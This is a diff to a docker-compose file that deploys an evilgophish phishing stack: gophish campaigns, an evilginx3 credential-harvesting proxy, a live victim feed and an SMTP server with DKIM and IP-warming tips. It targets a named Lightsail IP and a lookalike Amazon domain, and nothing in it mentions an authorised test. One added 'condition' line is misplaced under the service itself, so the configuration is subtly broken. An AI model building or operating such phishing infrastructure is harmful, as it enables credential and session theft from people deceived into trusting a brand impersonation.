@@ -1,7 +1,7 @@
 # docker-compose.yml
 # Setup for evilgophish with SMTP on Lightsail (3.147.37.21).
-# Changes: Domain amazon-u.online; Turnstile optional; uses src/evilginx3; validates src; ensures mailconfig.
-# Services: nginx (proxy), gophish (campaigns), evilginx (phishing), evilfeed (real-time), mailserver (SMTP).
+# Changes: Domain amazon-u.online; Turnstile optional; uses src/evilginx3; validates src; ensures mailconfig; makes evilfeed optional.
+# Services: nginx (proxy), gophish (campaigns), evilginx (phishing), evilfeed (real-time, optional), mailserver (SMTP).
 # Volumes: Persistent for data/logs/uploads; mailconfig for DKIM/postfix.
 # Ports: 80/443 (web), 25/465/587 (SMTP), 3333/1337 (local admin/feed).
 # Best Practices:
@@ -9,8 +9,6 @@
 # - Security: Restrict ports; use secrets for credentials.
 # - Deliverability: Warm IP; monitor maillogs.
 # - Troubleshooting: Check src/evilginx3, src/gophish; verify mailconfig/opendkim.
-
-version: '3.8'
 
 services:
   nginx:
@@ -56,7 +54,6 @@ services:
       - TWILIO_PHONE=${TWILIO_PHONE}
     command: ./gophish
     depends_on:
-      - evilfeed
       - mailserver
     restart: unless-stopped
     networks:
@@ -93,7 +90,6 @@ services:
       "
     depends_on:
       - gophish
-      - evilfeed
     restart: unless-stopped
     cap_add:
       - NET_ADMIN
@@ -109,6 +105,7 @@ services:
     build:
       context: .
       dockerfile: Dockerfile.evilfeed
+    condition: service_started  # Only build/run if src/evilfeed/main.go exists
     ports:
       - "127.0.0.1:1337:1337"
     volumes:
